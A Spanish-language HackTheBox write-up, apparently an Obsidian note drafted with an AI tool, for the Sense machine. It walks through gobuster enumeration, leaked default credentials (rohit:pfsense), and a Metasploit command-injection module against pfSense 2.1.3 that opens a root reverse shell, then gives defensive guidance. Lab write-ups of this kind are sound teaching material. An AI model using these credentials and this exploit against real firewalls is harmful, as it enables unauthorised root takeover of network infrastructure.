---
title: Sense (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, bsd, pfsense, rce, credenciales-por-defecto, enumeracion-web, escalada-root]
type: nota
status: en-progreso
source: claude-code
aliases: [Sense HTB, HTB Sense, pfsense rce htb]
---

# Sense — HackTheBox (Easy)

**SO:** FreeBSD (pfSense) · **Dificultad:** Easy · **Skills:** enumeración de ficheros web, credenciales por defecto, RCE autenticado (inyección de comandos en pfSense 2.1.3)

Sense es una máquina BSD que corre pfSense, un firewall/router open-source basado en FreeBSD. El camino completo tiene tres pasos lineales: encontrar credenciales filtradas en ficheros expuestos por el servidor web, autenticarse en el panel de administración y explotar una inyección de comandos conocida que entrega RCE directo como `root`. Al ser pfSense un proceso que corre con privilegios de sistema, no hay escalada separada: el foothold ya es root.

> **Nota ética:** HackTheBox es un laboratorio de ciberseguridad legal y autorizado. Estos ataques solo deben practicarse en sus máquinas o en entornos con permiso explícito.

---

## Objetivo

Obtener acceso a la máquina como `root` (o equivalente) y leer las flags `user.txt` y `root.txt`.

---

## Acceso a la máquina (paso previo)

1. Descarga tu perfil VPN desde HTB y conéctate:
   ```bash
   sudo openvpn lab_<tu_usuario>.ovpn
   ```
   Deja la terminal abierta durante toda la sesión.

2. En la web de HTB, accede a la máquina **Sense** (sección *Retired Machines*, requiere suscripción VIP) y pulsa **Spawn Machine**. HTB asignará una IP dinámica del rango `10.10.10.x`.

3. Verifica conectividad:
   ```bash
   ping -c2 <IP>
   ```

4. Sustituye `<IP>` por la IP que te haya asignado HTB en todos los comandos siguientes. El Pwnbox (Kali en el navegador) ya viene con la VPN configurada.

---

## Reconocimiento

**Categoría: escaneo de puertos y detección de servicio.**

```bash
nmap -sC -sV -oN nmap_sense.txt <IP>
```

Resultado relevante (puede variar levemente):

```
443/tcp open  ssl/http  lighttpd 1.4.35
|_http-title: Did Not Follow Redirect to https://<IP>/
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/...
```

Solo el puerto **443 (HTTPS)** está expuesto. El banner del servidor es `lighttpd`. Navegar a `https://<IP>/` redirige al panel de login de **pfSense 2.1.3**.

> pfSense es un sistema operativo de firewall/router basado en FreeBSD. Al correr como appliance, el proceso web ejecuta con privilegios de `root`.

---

## Enumeración

**Categoría: enumeración de ficheros y directorios web con extensiones.**

El paso crítico aquí es buscar ficheros con extensiones de texto/configuración, no solo directorios. Con `gobuster` (o `dirb`/`ffuf`):

```bash
gobuster dir \
  -u https://<IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x txt,conf \
  -k \
  -t 30
```

- `-x txt,conf`: extiende la búsqueda a ficheros con esas extensiones.
- `-k`: ignora errores de certificado SSL autofirmado.

Dos hallazgos clave:

| Fichero encontrado | Contenido |
|----|---|
| `/changelog.txt` | Menciona que hay un usuario con credenciales por defecto aún sin cambiar. |
| `/system-users.txt` | Revela el nombre de usuario **rohit** y la contraseña: la contraseña por defecto de pfSense (**pfsense**). |

```
####Support ticket###

Please create the following user

username: rohit
password: company defaults
```

"Company defaults" significa la contraseña por defecto de pfSense: `pfsense`.

---

## Acceso inicial (foothold)

**Categoría: autenticación con credenciales por defecto + RCE autenticado (inyección de comandos).**

### Paso 1 — Login en pfSense

Accede a `https://<IP>/` e introduce:

- **Usuario:** `rohit`
- **Contraseña:** `pfsense`

Acceso concedido al panel de administración de pfSense 2.1.3.

### Paso 2 — Explotación de la inyección de comandos

**CVE/Exploit:** pfSense <= 2.1.3 es vulnerable a una inyección de comandos autenticada en el fichero `status_rrd_graph_img.php`. El parámetro `database` no sanitiza la entrada y se pasa directamente a un comando del sistema.

Búsqueda en ExploitDB:

```bash
searchsploit pfsense 2.1.3
```

Hay un exploit público (ExploitDB 43560 / Metasploit `exploit/unix/http/pfsense_graph_injection_exec`). El módulo de Metasploit automatiza el proceso, pero la mecánica es:

1. El endpoint `/status_rrd_graph_img.php?database=<valor>` construye internamente un comando de sistema interpolando el parámetro `database`.
2. Al inyectar un separador de comandos (`;` o `|`) más un comando arbitrario, el servidor lo ejecuta como `root`.
3. La vía estándar es establecer una reverse shell o ejecutar comandos directamente.

**Con Metasploit** (vía estándar para esta máquina):

```bash
msfconsole -q
use exploit/unix/http/pfsense_graph_injection_exec
set RHOSTS <IP>
set LHOST <TU_IP_TUN0>
set USERNAME rohit
set PASSWORD pfsense
run
```

Si el módulo lo requiere, ajusta `SSL true` y `RPORT 443`. Consulta `show options` para verificar antes de lanzar.

Al tener éxito, obtienes una sesión de `root` directamente. pfSense no tiene separación de privilegios: el proceso web corre como `root` en FreeBSD, por lo que no hay escalada posterior.

---

## Escalada de privilegios

**No aplica.** El RCE en pfSense entrega una shell con UID 0 (`root`) de forma directa. El modelo de seguridad de pfSense asume que solo usuarios de confianza acceden al panel; si el panel cae, cae todo el sistema.

---

## Flags

Desde la sesión obtenida:

```bash
# Flag de usuario (home de rohit)
cat /home/rohit/user.txt
# <flag>

# Flag de root
cat /root/root.txt
# <flag>
```

Localización:
- `user.txt` → `/home/rohit/user.txt`
- `root.txt` → `/root/root.txt`

---

## Patrón y teoría

**Esta sección es el núcleo didáctico. Analiza los patrones de ataque y cómo defender/diseñar contra ellos.**

### Patrón de ataque completo

```
Enumeración web con extensiones
        ↓
Fichero expuesto con credenciales (system-users.txt)
        ↓
Login con contraseña por defecto (rohit:pfsense)
        ↓
RCE autenticado en pfSense 2.1.3 (inyección de comandos)
        ↓
Shell como root (sin escalada: pfSense corre privilegiado)
```

La cadena completa tiene tres eslabones independientes, cada uno suficiente para detener el ataque si se corrige.

---

### Eslabón 1 — Ficheros con secretos expuestos en el servidor web

**Schema:** exposición de información sensible (CWE-538: Insertion of Sensitive Information into Externally-Accessible File).

El servidor sirve `system-users.txt` porque está en el directorio raíz de lighttpd. No hay autenticación sobre ese recurso.

**Defensa para desarrolladores:**
- Nunca almacenes credenciales, tickets de soporte o configuraciones en directorios servidos por el webserver.
- Implementa reglas de acceso explícitas: todo lo que no sea público debe requerir autenticación o estar fuera del document root.
- Audita periódicamente los ficheros accesibles en producción (`find /var/www -name "*.txt" -o -name "*.conf"`).
- En pipelines CI/CD: usa `git-secrets` o `truffleHog` para detectar credenciales commiteadas antes de que lleguen a producción.

Ver [[05-identidad-auth-y-secretos]].

---

### Eslabón 2 — Credenciales por defecto

**Schema:** uso de credenciales por defecto (CWE-1392).

pfSense trae `admin:pfsense` de fábrica. El fichero indica que rohit no cambió la contraseña. Este patrón aparece en routers, cámaras IP, paneles de administración industriales (SCADA), y cualquier appliance desplegado sin hardening.

**Defensa:**
- Forzar cambio de contraseña en el primer login (o durante el proceso de provisioning).
- Deshabilitar cuentas por defecto si no se van a usar.
- Inventario de credenciales por defecto como parte del checklist de hardening de infraestructura.
- En aplicaciones propias: no hardcodear credenciales de demostración que puedan llegar a producción.

Ver [[05-identidad-auth-y-secretos]].

---

### Eslabón 3 — RCE por inyección de comandos en parámetro no sanitizado

**Schema:** inyección de comandos OS (CWE-78), variante autenticada.

`status_rrd_graph_img.php` construye un comando de sistema interpolando directamente el parámetro `database` de la petición HTTP. Equivale a:

```php
// Pseudocódigo vulnerable
$cmd = "/usr/bin/rrdtool ... " . $_GET['database'];
exec($cmd);
```

Un atacante autenticado puede romper el comando con `;` o `|` e inyectar comandos arbitrarios.

**Defensa para desarrolladores:**
- **Nunca interpoler entrada del usuario en comandos de sistema.** Usa APIs de proceso con argumentos separados (en Python: `subprocess.run(["cmd", arg1, arg2])`, no `shell=True`).
- Si necesitas llamar a herramientas externas, valida la entrada contra una whitelist estricta antes de pasarla.
- Principio de mínimo privilegio: el proceso web nunca debería correr como `root`. Si pfSense hubiera corrido como usuario sin privilegios, el impacto del RCE habría sido mucho menor.
- Actualizar software: pfSense 2.1.3 data de 2014. Las versiones modernas corrigen esta vulnerabilidad. El ciclo "despliego y olvido" es uno de los vectores más comunes en infraestructura de red.

Ver [[03-seguridad-de-redes]].

---

### Lección transversal (purple team)

Esta máquina ilustra un patrón muy frecuente en entornos reales de red interna y OT/IoT:

> **Appliance de red con panel web + credenciales por defecto + CVE conocido = compromiso total sin escalada.**

Desde el punto de vista de defensa, el panel de administración de un firewall es un activo crítico: si cae, cae la segmentación de red. Los controles mínimos son:
1. Aislarlo en una VLAN de gestión sin acceso desde redes de usuario.
2. Hardening en el primer despliegue (cambio de credenciales, desactivación de servicios innecesarios).
3. Parcheo regular y alertas ante versiones con CVE conocidos.
4. Monitorización de logins: un login exitoso desde una IP inesperada debería generar una alerta.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[MOC_Ciberseguridad]]
- [[HTB_Starting_Point/00_README]]
- [[12-aprender-y-carrera]]
- [[03-seguridad-de-redes]]
- [[05-identidad-auth-y-secretos]]
